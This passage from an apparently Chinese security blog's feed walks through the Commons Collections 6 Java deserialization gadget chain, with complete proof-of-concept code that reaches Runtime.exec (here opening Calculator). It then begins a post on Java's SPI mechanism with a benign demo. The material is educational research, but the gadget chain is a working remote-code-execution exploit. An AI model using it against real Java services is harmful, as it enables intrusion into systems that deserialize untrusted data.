class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008153450633.png" alt="image-20221008153450633"></p><p>除了<code>outerMap.remove()</code>删除键值对，我们还可以通过替换 key 的方式进行处理。</p><p><code>HashMap</code>将键值对存储在了<code>Node&lt;K,V&gt;[] table</code>中，并封装在<code>Node</code>对象里，其中<code>Node</code>是<code>HashMap</code>内部的静态类<br><img src="images/image-20221008161018495.png" alt="image-20221008161018495"></p><p>因此我们首先需要通过反射获取到<code>table</code>字段，然后因为我们没有获取到<code>Node</code>类，所以之类需要转换为<code>Object</code>类型。最后取到数组中的 key 进行替换<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><strong>坑点！！！</strong></p><p>如果有同学将 key 取值成<code>keyTest</code>，而不是<code>aaa</code>时，会发现报错为空<br><img src="images/image-20221008174729245.png" alt="image-20221008174729245"></p><p>调试了一下，发现如果<code>key</code>为<code>keyTest</code>字符串时，变成了<code>array[4]</code>才能取到我们前面设置的值。<br><img src="images/image-20221008174748438.png" alt="image-20221008174748438"></p><p>这是为什么呢？继续怀着好奇心调试，发现问题还是在 put 上，可以看到这里对<code>key</code>传进了<code>hash()</code>方法中进行运算<br><img src="images/image-20221008174930212.png" alt="image-20221008174930212"></p><p><img src="images/image-20221008180314692.png" alt="image-20221008180314692"></p><p>因此 key 为<code>aaa</code>和<code>keyTest</code>的值完全不同，导致了最后 i 分别为 0 和 4<br><img src="images/image-20221008175056295.png" alt="image-20221008175056295"></p><p><img src="images/image-20221008175106525.png" alt="image-20221008175106525"></p><p>因此修改最终 POC为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;keyTest&quot;</span>;</span><br><span class="line">        expMap.put(key ,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[((h=key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; (array.length -<span class="number">1</span>)];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008180530399.png" alt="image-20221008180530399"></p><h2 id="ysoserial的做法"><a href="#ysoserial的做法" class="headerlink" title="ysoserial的做法"></a>ysoserial的做法</h2><p>接着看看<code>ysoserial</code>的实现，给出的利用链为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>对比前面的，可以发现<code>ysoserial</code>采用的是<code>HashSet</code>，在<code>HashSet#readObject()</code>方法中最后会调用到<code>HashMap#put()</code><br><img src="images/image-20221009103459255.png" alt="image-20221009103459255"></p><p>而通过前面的分析，我们知道<code>HashMap#put()</code>最终也会调用到<code>hashCode()</code>方法，这里就不赘述了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SPI机制</title>
      <link href="/2022/11/10/SPI%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/11/10/SPI%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><blockquote><p>最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml的反弹也是使用的SPI机制</p></blockquote><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，或者换句话说，<strong>SPI是一种服务发现机制</strong> </p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>定义接口 SpiService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口的方法的类SpiServiceA.java (<strong>需要注意SPI机制的实现类必须有一个无参构造方法</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceA</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceA.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiServiceB.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceB</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceB.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 